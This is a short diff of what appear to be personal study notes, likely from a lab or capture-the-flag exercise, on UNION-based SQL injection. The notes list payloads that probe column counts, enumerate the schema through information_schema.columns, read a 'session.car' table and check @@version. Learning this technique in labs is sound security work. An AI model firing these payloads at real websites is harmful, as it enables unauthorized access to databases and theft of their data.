@@ -140,3 +140,7 @@ cahnge selection number until info shows up
     Selection=2 UNION SELECT 1,2,3
 ## Step 3 Edit Golden Statement
     UNION SELECT table_schema,column_name,table_name from information_schema.columns
+## Step 4 Caft a query
+
+    Union SELECT name,type,cost from session.car 
+    @@version to see version of sql 
